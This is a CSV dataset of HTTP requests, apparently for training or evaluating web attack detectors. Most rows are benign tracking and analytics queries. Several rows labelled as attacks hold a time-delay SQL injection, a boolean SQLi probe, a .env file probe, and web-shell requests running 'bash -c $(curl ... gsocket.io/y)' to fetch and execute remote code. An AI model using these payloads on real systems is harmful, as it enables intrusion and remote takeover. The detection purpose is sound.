"hash_type","hash","rows","labels","sources","notes","sample_ids","sample_method","sample_path","sample_query"
"endpoint_shape_hash","3999d06e3ea0997d9cf94ff5","3","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_000034|norm_modsec_learn_000033|norm_modsec_learn_000035","GET","/","OrgId=WMNR1&UserId=4842632323731456&SessionId=6012698725650432&PageId=4941030901092352&Seq=2&PageStart=1660130855199&PrevBundleTime=1660130855976&LastActivity=40"
"endpoint_shape_hash","3c30ad3271165bb963eaef38","3","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_002669|norm_modsec_learn_002670|norm_modsec_learn_002668","GET","/","random=1660549551657&cv=9&fst=1660549551657&num=1&value=239.94&bg=ffffff&guid=ON&resp=GooglemKTybQhCsO&eid=376635471&u_h=1080&u_w=1920&u_ah=1040&u_aw=1920&u_cd=24&u_his=14&u_tz=180&u_java=false&u_nplug=5&u_nmime=2&gtm=2wg880&sendb=1&ig=1&data=event%3Dadd_to_cart%3Bvisitor_type%3Dguest%3Becomm_prodid"
"endpoint_shape_hash","44a24c8d4be6975586a3a2e9","3","1","owasp_modsecurity","owasp_xss:920450","pos_owasp_modsec_002825|pos_owasp_modsec_002252|pos_owasp_modsec_002455","GET","/isotope.js",""
"endpoint_shape_hash","451fb53baa1a22b3071e14d8","3","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_000578|norm_modsec_learn_000581|norm_modsec_learn_001128","GET","/","xai=AKAOjssBoDwt_-luxcicI8s43ljlH9-Do0B2NwKrhamxIcgkhc-xqAShMIpAUh8jNi1E0qP-r9zqzhLLKPZ8ZenbCBHBHrDywwoAHBlghksjO-1WUERj3V-F&sig=PRESENT&id=lidartos&mcvt=0&p=0,0,0,0&mtos=0,0,0,0,0&tos=0,0,0,0,0&v=20220914&bin=7&avms=nio&bs=0,0&mc=0&if=1&vu=1&app=0&itpl=3&adk=1617140058&rs=4&la=0&cr=0&uach=WyJXaW5kb"
"endpoint_shape_hash","478439da2e2adf9ddba2d9d4","3","0","openappsec_legitimate","normal","norm_legitimate_002119|norm_legitimate_002362|norm_legitimate_002177","GET","/interest-group","data=U6l8SXxiRndDYjhUK1JvTXFBUExQa3Z5TDE4cWtKRkdpWjNyVEs4akhaZWVlWGNKR1I5M2ROT3laeSsrOEl6V3kzWXNtZXNwMFNtajE2WWlYUFJyS28xdzdZSWJxVGlzNU1hSEYya0R0ajExQStPOHZ2dERsTGdzdm1MMW1RMVpkNkI4T1RaNWFOVkRxS0dRNnQ3ZlhsQ3JoR1JVL3MrOTdZaVpMdnVaVVkyVjgvc009fA"
"endpoint_shape_hash","47e52ae0ef33e40b282db26b","3","0","openappsec_legitimate","normal","norm_legitimate_002871|norm_legitimate_002955|norm_legitimate_002836","GET","/api/ship/checkShipToBubbleFatigue","callback=jsonp_1728488056385_10080"
"endpoint_shape_hash","49f67229041c700a23de08e6","3","0","openappsec_legitimate","normal","norm_legitimate_001601|norm_legitimate_001591|norm_legitimate_000329","GET","/id","d_visid_ver=5.4.0&d_fieldgroup=A&mcorgid=9E1005A551ED61CA0A490D45%40AdobeOrg&mid=65842033163252052590650599187194463690&ts=1728347196082"
"endpoint_shape_hash","4a60ff1ce15630ae9dcf88ea","3","1","csic_2010","csic_anomalous","pos_csic_002518|pos_csic_002854|pos_csic_000315","GET","/tienda1/publico/anadir.jsp.java",""
"endpoint_shape_hash","4a8373d24ca7bcff12376b3c","3","1","owasp_modsecurity","owasp_sqli:932115|owasp_sqli:942100","pos_owasp_modsec_000996|pos_owasp_modsec_000163|pos_owasp_modsec_002026","GET","/d_eac5f762/d_a0e62b38","email=testing%40example.com&nf-field-1-textbox=1&nf-field-3=555YpXxKKq3';%20waitfor%20delay%20'0:0:15'%20--%20&nf-field-hp=1&orderby=popularity&paged=1"
"endpoint_shape_hash","4aea033daf24d02a5bfdf2fd","3","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_001597|norm_modsec_learn_000466|norm_modsec_learn_001596","GET","/","tid=2616816324064&pd=%7B%22np%22%3A%22gtm%22%2C%22pin_unauth%22%3A%22dWlkPU5UVTBPRFkxWVRndE1URXdZeTAwWXpZM0xXSXdaRGt0WlRSbU9XSTFNREZsWlRNMQ%22%7D&event=init&ad=%7B%22loc%22%3A%22https%3A%2F%2Fwww.nike.com%2Fil%2Fw%2Fwomens-shoes-5e1x6zy7ok%22%2C%22ref%22%3A%22https%3A%2F%2Fwww.nike.com%2Fil%2F%3Fcp%"
"endpoint_shape_hash","4d3bb8de99ad45d042cc39c0","3","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_000675|norm_modsec_learn_000676|norm_modsec_learn_000677","GET","/","beacon=1&session-id=0677c8a276ed88687bf83ed857cb426422f0828c1660550417"
"endpoint_shape_hash","4d451817050aaacedc29fd97","3","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_002270|norm_modsec_learn_002269|norm_modsec_learn_002268","GET","/","v=11.6.3&str=58&di=872&dc=1725&fl=1727&sr=55&mdh=24056&pn=15&uu=2f5e8414-b504-a026-864b-e4affc7192d0&sn=1&lv=1663515267&lhd=1663515267&hd=1663515547&pid=613&ct=1"
"endpoint_shape_hash","51afa8057dadb56fc8030e83","3","0","openappsec_legitimate","normal","norm_legitimate_001602|norm_legitimate_001693|norm_legitimate_001581","GET","/json/","callback=privacy_172834719621796302"
"endpoint_shape_hash","5322e436dc549764393b839c","3","0","openappsec_legitimate","normal","norm_legitimate_001095|norm_legitimate_001027|norm_legitimate_001125","POST","/g/collect","v=2&tid=G-4DGGV4HV95&gtm=45je46q0v888916367za200&_p=1719747599199&gcs=G111&gcd=13t3t3t3t5&npa=0&dma=0&tag_exp=0&gdid=dYmQxMT&cid=259251594.1719747522&ul=en-us&sr=1920x1080&ir=1&uaa=x86&uab=64&uafvl=Not%252FA)Brand%3B8.0.0.0%7CChromium%3B126.0.6478.127%7CGoogle%2520Chrome%3B126.0.6478.127&uamb=0&uam="
"endpoint_shape_hash","53824e4992fe0f7e3a2c8e96","3","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_002302|norm_modsec_learn_002306|norm_modsec_learn_002307","GET","/","value=1.00&currency_code=USD&label=1ojMCLrE6JgBELet47gD&guid=ON&script=0&is_vtc=1&random=2359625644&ipr=y"
"endpoint_shape_hash","5470dfd9c1814023e2466c5a","3","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_001188|norm_modsec_learn_001187|norm_modsec_learn_001186","GET","/","a=53868&v=5.12.0&p0=e%3Dvh&p1=e%3Dexd%26ref%3Dhttps%253A%252F%252Fwww.levi.com&p2=e%3Ddis&bundle=dcDCqF8lMkZrbEhpcjJLRFBOYXBYVU1pNWpoUllUM09hQm12Y1pmdVlhd3NINFVwOUc5OVQ0VURJUEl6enljY2phQlpDOXBuQVolMkZZZnh0NzdxdHM4bm8lMkZDeUJLZ3ZkekNEeDNGWTZKR0tqRjRqZFVlbSUyRmRscnRWJTJGeFZyV3FYM1NLbWJySXg4djFrNzMlMkJ"
"endpoint_shape_hash","55012144c29a2e1330d30c1e","3","1","owasp_modsecurity","owasp_php_injection:933140","pos_owasp_modsec_002947|pos_owasp_modsec_001810|pos_owasp_modsec_001987","POST","/d_795dc9a1/d_9d047632",""
"endpoint_shape_hash","5587bfa193ad6731b19a8135","3","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_002646|norm_modsec_learn_000312|norm_modsec_learn_002645","GET","/","rand=tdw4rhl2m"
"endpoint_shape_hash","561de71e4f50de667ac4be85","3","0","openappsec_legitimate","normal","norm_legitimate_002910|norm_legitimate_002899|norm_legitimate_002915","GET","/openservice/gatewayService","callback=jsonp_1728488067953_32036&ctoken=swxciqp8n4f5&_tb_token_=e3b8e3385546b&mtop=false&modelId=11159&deliveryId=undefined&cardId=&deliveryBomId=&categoryIds=&topOfferIds=1601044926258&pageSize=10&pageNo=3&offerLimit=&appKey=vee8meczxjj3hugfjlmg0t4zh4skimd3&appNameCarry=asinHomePage&appName=asinH"
"endpoint_shape_hash","5a6b57002679d023dca715a3","3","1","exploitdb","sqli","pos_luongvd_001625|pos_luongvd_001623|pos_luongvd_001624","GET","/store/productsofcat.asp","p=1&category_id=17+and+1=100"
"endpoint_shape_hash","5cd6dcc1ee2ac1c68ca894f1","3","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_002956|norm_modsec_learn_000835|norm_modsec_learn_000834","GET","/","key=PRESENT"
"endpoint_shape_hash","5e34b5dbad99b524e75f6d49","3","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_000763|norm_modsec_learn_001894|norm_modsec_learn_001289","GET","/","gclid=CjwKCAjw0dKXBhBPEiwA2bmObTsp6rj60asriDwZwRSK5-0tT-fdBOeC2FkxINSFAS4sAPfm_7CUFRoC62MQAvD_BwE"
"endpoint_shape_hash","5fae1f9895a0f15683073ff2","3","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_002545|norm_modsec_learn_000249|norm_modsec_learn_000251","GET","/","k=777457ab6c705226595b91da796c8d76df2cdd715de346de3bd09fe2a0288502&o=&s=1"
"endpoint_shape_hash","61d8f3133a23f88519df9614","3","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_001621|norm_modsec_learn_001633|norm_modsec_learn_001620","GET","/","type=f&size=150x150&quality=75&direct=true&src=https%3A%2F%2Fmusicmeta-phinf.pstatic.net%2Falbum%2F007%2F936%2F7936139.jpg%3Ftype%3Dr204Fll%26v%3D20220819170022"
"endpoint_shape_hash","623b9ccc5566449d24c110f5","3","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_002249|norm_modsec_learn_002250|norm_modsec_learn_002248","GET","/","v=1&_v=j96&aip=1&a=1451036377&t=event&ni=0&_s=1&dl=https%3A%2F%2Fwww.semrush.com%2Fanalytics%2Foverview%2F%3FsearchType%3Ddomain%26q%3Dapplemusic.com&dp=%2Fanalytics%2Foverview%2F%3FsearchType%3Ddomain%26q%3Dapplemusic.com&ul=en-us&de=UTF-8&dt=applemusic.com%3A%20Domain%20Overview&sd=24-bit&sr=1920x"
"endpoint_shape_hash","636abe87de6e4b73d06ad7d1","3","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_002410|norm_modsec_learn_000721|norm_modsec_learn_002411","GET","/","d=AHNF13J0Lk1SImNcp21ArsRuVeqksVYsaMTrl--3izqre5KBnpzfYXlL1EAWuxODgPPWJkGWTqJdBg"
"endpoint_shape_hash","63da057ac3b72ebb8d383807","3","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_000285|norm_modsec_learn_000884|norm_modsec_learn_002636","GET","/","pid=13478"
"endpoint_shape_hash","697f7aa589d05f132dbd61e5","3","0","openappsec_legitimate","normal","norm_legitimate_002194|norm_legitimate_002254|norm_legitimate_002371","POST","/RT",""
"endpoint_shape_hash","69cce098cfa3f1143f126d3f","3","1","csic_2010","csic_anomalous","pos_csic_002750|pos_csic_000071|pos_csic_002210","GET","/tienda1/publico/autenticar.jsp","modo=entrar&login=yoonmo2&pwdA=azo5da&remember=off&B1=Entrar"
"endpoint_shape_hash","6bb52f802cd81d07a9736d19","3","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_000308|norm_modsec_learn_000309|norm_modsec_learn_000310","GET","/","r=135186548&nv=t&p=%5B%7B%22maskyoo%22%3A%220772315888%22%7D%2C%7B%22maskyoo%22%3A%220772307744%22%7D%2C%7B%22maskyoo%22%3A%220772307755%22%7D%2C%7B%22maskyoo%22%3A%220772315588%22%7D%2C%7B%22maskyoo%22%3A%220772315599%22%7D%2C%7B%22maskyoo%22%3A%220772315666%22%7D%2C%7B%22maskyoo%22%3A%220772316000"
"endpoint_shape_hash","6bd054e579d7aeaf17ecee12","3","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_001645|norm_modsec_learn_001658|norm_modsec_learn_002221","GET","/","v=1&_v=j96&a=1295186106&t=pageview&_s=1&dl=https%3A%2F%2Fwww.happyman.co.il%2FCheckoutCart&ul=en-us&de=UTF-8&dt=HAPPY%20MAN%20%7C%20%D7%A2%D7%92%D7%9C%D7%AA%20%D7%94%D7%A7%D7%A0%D7%99%D7%95%D7%AA&sd=24-bit&sr=1920x1080&vp=1920x969&je=0&_u=CACAAEABEAAAAC~&jid=&gjid=&cid=725288241.1660484839&tid=UA-32"
"endpoint_shape_hash","6d044b93f64f7b204e74ac11","3","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_002491|norm_modsec_learn_002490|norm_modsec_learn_002492","GET","/","id=1864990017077937&ev=ViewCategory&dl=https%3A%2F%2Ftoysrus.co.il%2Fall-products.html&rl=https%3A%2F%2Ftoysrus.co.il%2Fall-products.html%3Fseries%3D22408&if=false&ts=1660648002777&cd[source]=magento&cd[version]=&cd[pluginVersion]=&cd[content_category]=%D7%9B%D7%9C%20%D7%94%D7%9E%D7%95%D7%A6%D7%A8%D"
"endpoint_shape_hash","6e1f1beaf557c25a6d012142","3","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_002087|norm_modsec_learn_002665|norm_modsec_learn_002093","GET","/","random=1660560452367&cv=9&fst=1660560452367&num=1&bg=ffffff&guid=ON&resp=GooglemKTybQhCsO&eid=376635470&u_h=1080&u_w=1920&u_ah=1040&u_aw=1920&u_cd=24&u_his=3&u_tz=180&u_java=false&u_nplug=5&u_nmime=2&gtm=2wg880&sendb=1&ig=1&frm=0&url=https%3A%2F%2Fwww.officedepot.co.il%2Fmy-account%2F&ref=https%3A%2"
"endpoint_shape_hash","6e8e449ece501d5cce0d323f","3","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_001764|norm_modsec_learn_001763|norm_modsec_learn_001765","GET","/","AQB=1&ndh=1&pf=1&t=14%2F8%2F2022%2016%3A19%3A8%203%200&mid=37948779484046732874114298744232041048&aamlh=6&ce=UTF-8&pageName=%2Fmmb%2F1%2Fchoose%20options&g=https%3A%2F%2Fwww.shutterfly.com%2Fmmb%2F%3Ficid%3DMMB%257CSC%257CC1%257C080122%257CMakeMyBook%257CGetStarted%3FstyleId%3D6096%26coverSpecId%3D1"
"endpoint_shape_hash","6ec446d14671aff38c85ed6a","3","0","openappsec_legitimate","normal","norm_legitimate_000945|norm_legitimate_001212|norm_legitimate_000891","POST","/horizon/adidasgroup","T=B&u=https%3A%2F%2Fwww.adidas.com%2Fus%2Fkids&t=1719747574479&v=1719747577383&H=f843816639ff2904633a012e&s=aa3bbc1a791d8c7348e559873f77a0d2&f=1719747577383&Q=2&S=2587&N=1&z=2"
"endpoint_shape_hash","6f48c2d072ae07e3eb2b9682","3","0","openappsec_legitimate","normal","norm_legitimate_002919|norm_legitimate_002935|norm_legitimate_002897","GET","/openservice/gatewayService","callback=jsonp_1728488070877_4500&ctoken=swxciqp8n4f5&_tb_token_=e3b8e3385546b&modelId=24&appName=ncms-bootstrap&appKey=vee8meczxjj3hugfjlmg0t4zh4skimd3"
"endpoint_shape_hash","707f4149716a42d93582c66e","3","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_001896|norm_modsec_learn_000772|norm_modsec_learn_000770","GET","/","google_nid=adobe_dmp&google_cm&gdpr=0&gdpr_consent=&google_hm=NTQ2MjIzMDY2MTAwOTcyMDQ3MTM4NDIyMTMxNDU4NzcyODgxODc="
"endpoint_shape_hash","70da15ee4d3c7439a7bed675","3","0","openappsec_legitimate","normal","norm_legitimate_002466|norm_legitimate_002464|norm_legitimate_002462","POST","/metrics/ui",""
"endpoint_shape_hash","72fab49a51c0078d363dcb8a","3","1","owasp_modsecurity","owasp_lfi_rfi:930130","pos_owasp_modsec_002281|pos_owasp_modsec_000080|pos_owasp_modsec_001083","GET","/awstats/.env",""
"endpoint_shape_hash","733084a05f675fcbdd637333","3","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_001572|norm_modsec_learn_001571|norm_modsec_learn_001570","GET","/","src=http%3A%2F%2Fimage.nmv.naver.net%2Fblog_2022_08_08_1257%2F9c22e401-16d9-11ed-bcc7-505dac8c385b_01.jpg%23152x114%23m&type=ff264_180"
"endpoint_shape_hash","738836c5b3b85bceee4945ab","3","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_001391|norm_modsec_learn_001390|norm_modsec_learn_001389","GET","/","imageOpt=1&fit=bounds&width=290"
"endpoint_shape_hash","74ec02ca490bb4bbb7ebbbe5","3","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_001420|norm_modsec_learn_001421|norm_modsec_learn_001419","GET","/","operationName=getReviewSummaryInfo&locale=US-en_US"
"endpoint_shape_hash","755c35ecf735a0a5647a5135","3","0","openappsec_legitimate","normal","norm_legitimate_001379|norm_legitimate_001307|norm_legitimate_000998","POST","/v1/osm-client-script/0.0.264/aggr_b","ab=osm-frontends&d=credit-promotion-auto-size&h=EN&i=US&iid=1533&iv=web-sdk&level=2&sdk=websdk&sid=b05434e7-c42a-44b9-ac72-ea17918dc887&timestamp=1719747651435"
"endpoint_shape_hash","75dac729b527d4d0c3155a68","3","0","openappsec_legitimate","normal","norm_legitimate_002831|norm_legitimate_002893|norm_legitimate_002860","GET","/openservice/pcShadeSearchBusinessService","name=home_new_user_first_screen&bizScene=pcHomeProducts&pageSize=3&showAd=true&testKeys=pc_searchbar_query_carousel&callback=jsonp_1728488016938_46570"
"endpoint_shape_hash","765916c7b2be643bae7e81a9","3","0","openappsec_legitimate","normal","norm_legitimate_002920|norm_legitimate_002994|norm_legitimate_002948","GET","/api/ags/incentive/getCreativeIncentive.json","sceneCode=pc_free_shipping_detail_pop&aliId=undefined&cnaId=undefined&language=undefined&country=undefined&terminal=PC&timeZone=Asia%2FSaigon&currency=undefined&callback=jsonp_1728488070913_11012&ctoken=swxciqp8n4f5&_tb_token_=e3b8e3385546b"
"endpoint_shape_hash","76779fe2898d71c3151f0f24","3","0","openappsec_legitimate","normal","norm_legitimate_000083|norm_legitimate_000088|norm_legitimate_000089","POST","/gen_204","atyp=csi&ei=oR2zZvzmGZKl5NoPw9Ko0A4&s=async&astyp=asyncContextualTask&rt=ttfb.885,ft.890&zx=1723014564505&opi=89978449"
"endpoint_shape_hash","779d9511f90259659531ad01","3","0","openappsec_legitimate","normal","norm_legitimate_002921|norm_legitimate_002967|norm_legitimate_002887","GET","/ajax/user_portrait.htm","ctoken=swxciqp8n4f5&_tb_token_=e3b8e3385546b&callback=jsonp_1728488071963_79161"
"endpoint_shape_hash","7834604be63272f6856576f4","3","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_002797|norm_modsec_learn_002353|norm_modsec_learn_001175","GET","/","uid=7690241f-15cc-4d16-a426-2a9a95d15abf&_origin=0"
"endpoint_shape_hash","7c35c442c68df2f8771fcc43","3","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_000589|norm_modsec_learn_002914|norm_modsec_learn_000588","GET","/","yhlVer=2&yhlClient=rapid&yhlS=1197803560&yhlCT=2&yhlBTMS=1663761083479&yhlClientVer=3.53.38&yhlRnd=ALwmZHygYzF9pGns&yhlCompressed=3"
"endpoint_shape_hash","7e16d137c87e5aeb80a31f17","3","0","openappsec_legitimate","normal","norm_legitimate_002238|norm_legitimate_002218|norm_legitimate_002234","GET","/sync","c=9&r=1&a=1&u=https%3A%2F%2Faa.agkn.com%2Fadscores%2Fg.pixel%3Fsid%3D9212273938%26ct%3D%40USERID%40"
"endpoint_shape_hash","7f1a18f55b1a4a0cc8583c52","3","0","openappsec_legitimate","normal","norm_legitimate_000095|norm_legitimate_000100|norm_legitimate_002069","GET","/gtag/js","id=G-8TB61LMJKC&cx=c&_slc=1"
"endpoint_shape_hash","81ec280ca383cfce9a99f59e","3","0","openappsec_legitimate","normal","norm_legitimate_002170|norm_legitimate_002060|norm_legitimate_002296","GET","/1168919/trc/3/json","tim=1720601361603&data=%7B%22id%22%3A433%2C%22ii%22%3A%22%2Fstratosphere-hotel-casino-tower-bw-premier-collection%2Fhotel%2Flas-vegas-nv-us.html%22%2C%22it%22%3A%22video%22%2C%22sd%22%3Anull%2C%22ui%22%3Anull%2C%22vi%22%3A1720601361586%2C%22cv%22%3A%2220240704-7-RELEASE%22%2C%22uiv%22%3A%22default%2"
"endpoint_shape_hash","82e9dc75b23a76b3ddb19572","3","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_002228|norm_modsec_learn_002218|norm_modsec_learn_001061","GET","/","v=1&_v=j96&a=1967048605&t=event&ni=1&_s=1&dl=https%3A%2F%2Fshoesonline.co.il%2Fshop%2Ffashion-watches%2F%3Fpa_color-filter%3D%25d7%259c%25d7%2591%25d7%259f&ul=en-us&de=UTF-8&dt=%D7%A9%D7%A2%D7%95%D7%A0%D7%99%20%D7%90%D7%95%D7%A4%D7%A0%D7%94%20-%20%D7%9E%D7%A9%D7%9C%D7%95%D7%97%20%D7%97%D7%99%D7%A0%D"
"endpoint_shape_hash","835057dde114246a016b1021","3","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_002191|norm_modsec_learn_002770|norm_modsec_learn_000464","GET","/","ti=5424734&Ver=2&mid=bae6307c-e8ed-48ce-8b18-73225a650b02&sid=af1797601c5a11ed9520bb93dc5c901b&vid=af17aa401c5a11edabba7d871058b8d9&vids=0&msclkid=N&evt=dedup"
"endpoint_shape_hash","85d3d41e45540dc8a36872b3","3","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_001558|norm_modsec_learn_001559|norm_modsec_learn_002713","GET","/","s=193265&v=7.2&ac=j&sd=1&r=%7B%22id%22%3A%22R130092abee43df44%22%2C%22site%22%3A%7B%22ref%22%3A%22https%3A%2F%2Fwww.healthline.com%2Fnutrition%22%2C%22page%22%3A%22https%3A%2F%2Fwww.healthline.com%2Fnutrition%2Fthe-problem-with-the-mediterranean-diet-were-not-talking-about-enough%23Focusing-only-on-"
"endpoint_shape_hash","87b7303b9da88d3d962bea3c","3","0","openappsec_legitimate","normal","norm_legitimate_001384|norm_legitimate_001381|norm_legitimate_001385","GET","/843aa27f089f/0d5135d958464109968a7fc311417676/prop.json","_=1719747652430"
"endpoint_shape_hash","88c70b3726d4982aaba1b55e","3","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_002336|norm_modsec_learn_000621|norm_modsec_learn_000042","GET","/","T=B&u=https%3A%2F%2Fwww.t-mobile.com%2Fservices&t=1663681677016&v=1663681677975&H=d6ab6b13108e7a6275cc2236&s=338e6b6523e2e777f09c4d0a4f489cc3&U=e2c7a23690baebf021d4327828868e33&z=1&Q=2&S=0&N=0"
"endpoint_shape_hash","8b5f5c787fc6101da3f31c8c","3","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_000617|norm_modsec_learn_002332|norm_modsec_learn_000616","GET","/","IID=3FADB931-0BF8-33BE-B11A-BF214AD89DF0&origUrl=aHR0cHM6Ly9jZG4uYXBpLmJldHRlci1yZXBsYXkuY29tL3JlcGxheS5qcz9yZXBsYXlBcGlLZXk9YmQ3YmEwNDAtNjBmMi0xMWViLTk5YTQtOGRmM2U5MDY1YjRlJnByb29mX2lnbm9yZV9hZG1pbl92aXNpdHM9ZmFsc2Umc2hvcD1nZW50bGVtYW4tbWFucy13b3JsZC5teXNob3BpZnkuY29t"
"endpoint_shape_hash","8dda0253891a5de7e0d27285","3","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_001223|norm_modsec_learn_001222|norm_modsec_learn_001224","GET","/","cors=true&content-type=application/x-json-stream&client-id=NO_AUTH&client-version=1DS-Web-JS-3.1.10&apikey=PRESENT&upload-time=1663168093724&ext.intweb.msfpc=GUID%3D4806b3f3c0494f39800284df7a2c9c77%26HASH%3D4806%26LV%3D202209%26V%3D4%26LU%3D1663167949970&w=0&anoncknm=anon"
"endpoint_shape_hash","90ed460db2573bf56f8135ed","3","1","owasp_modsecurity","owasp_rce:932130","pos_owasp_modsec_000258|pos_owasp_modsec_002413|pos_owasp_modsec_000728","GET","/d_eda37985/d_4ff6ca68/d_4ff6ca68/shell.php","cmd=bash%20-c%20%22$(curl%20-fsSL%20https://gsocket.io/y)%22"
"endpoint_shape_hash","915d476e2e4a3beb44ea625e","3","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_000301|norm_modsec_learn_000300|norm_modsec_learn_000302","GET","/","q=Prince+Harry+Today&w=100&h=100&c=7&rs=1&p=0&o=5&pid=1.7&mkt=en-GB&cc=GB&setlang=en&adlt=moderate&t=1"
"endpoint_shape_hash","920bcd9bed0244becc18fb9b","3","1","owasp_modsecurity","owasp_rce:932130","pos_owasp_modsec_002412|pos_owasp_modsec_000612|pos_owasp_modsec_001900","GET","/cmd.php","cmd=bash%20-c%20%22$(curl%20-fsSL%20https://gsocket.io/y)%22"
"endpoint_shape_hash","9253f6c3fe50a6cb9dcf3e49","3","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_002600|norm_modsec_learn_002601|norm_modsec_learn_002599","GET","/","pb=!1m4!1m3!1i20!2i516334!3i339913!1m4!1m3!1i20!2i516334!3i339914!1m4!1m3!1i20!2i516334!3i339915!2m3!1e0!2sm!3i616349340!3m17!2sen-US!3sUS!5e18!12m4!1e68!2m2!1sset!2sRoadmap!12m3!1e37!2m1!1ssmartmaps!12m4!1e26!2m2!1sstyles!2zcy50OjJ8cy5lOmx8cC52Om9mZg!4e3!12m1!5b1!23i1379903&callback=_xdc_._s2u8aj&k"
